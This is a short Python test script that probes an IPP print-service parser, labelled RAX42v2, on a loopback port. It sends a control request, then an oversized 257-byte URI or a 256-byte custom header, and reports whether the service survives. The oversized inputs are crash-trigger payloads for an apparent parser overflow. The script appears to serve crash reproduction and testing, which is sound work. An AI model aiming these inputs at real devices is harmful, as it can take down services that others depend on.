#!/usr/bin/env python3
"""Bounded loopback-only RAX42v2 IPP parser availability probe."""

from __future__ import annotations

import argparse
import socket
import time


HOST = "127.0.0.1"
PORT = 25_142


def exchange(payload: bytes, timeout: float = 3.0, port: int = PORT) -> bytes:
    response = bytearray()
    with socket.create_connection((HOST, port), timeout=timeout) as client:
        client.sendall(payload)
        client.shutdown(socket.SHUT_WR)
        while True:
            chunk = client.recv(65536)
            if not chunk:
                break
            response.extend(chunk)
    return bytes(response)


def request(uri: bytes, header_value: bytes = b"control") -> bytes:
    return (
        b"POST " + uri + b" HTTP/1.1\r\n"
        b"Host: 10.0.2.15:631\r\n"
        b"Content-Type: application/ipp\r\n"
        b"X-Friday-Control: " + header_value + b"\r\n"
        b"Content-Length: 0\r\n"
        b"Connection: close\r\n\r\n"
    )


def status(response: bytes) -> str:
    return response.splitlines()[0].decode(errors="replace") if response else "no response"


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--case", choices=("control", "uri", "header"), default="control")
    parser.add_argument("--port", type=int, default=PORT)
    args = parser.parse_args()
    baseline = exchange(request(b"/printers/lab"), port=args.port)
    print(f"baseline={status(baseline)}")
    if args.case == "control":
        candidate = request(b"/printers/lab")
    elif args.case == "uri":
        # Keep the complete URI at 257 bytes, matching the bounded RAX30 case.
        candidate = request(b"/printers/" + b"A" * 247)
    else:
        candidate = request(b"/printers/lab", b"B" * 256)
    try:
        response = exchange(candidate, port=args.port)
        print(f"candidate={status(response)}")
    except OSError as exc:
        print(f"candidate={type(exc).__name__}: {exc}")
    time.sleep(3)
    try:
        after = exchange(request(b"/printers/lab"), port=args.port)
        print(f"post={status(after)}")
        healthy = status(after).startswith("HTTP/")
    except OSError as exc:
        print(f"post={type(exc).__name__}: {exc}")
        healthy = False
    print(f"service_available_after_candidate={str(healthy).lower()}")
    return 0 if healthy else 1


if __name__ == "__main__":
    raise SystemExit(main())
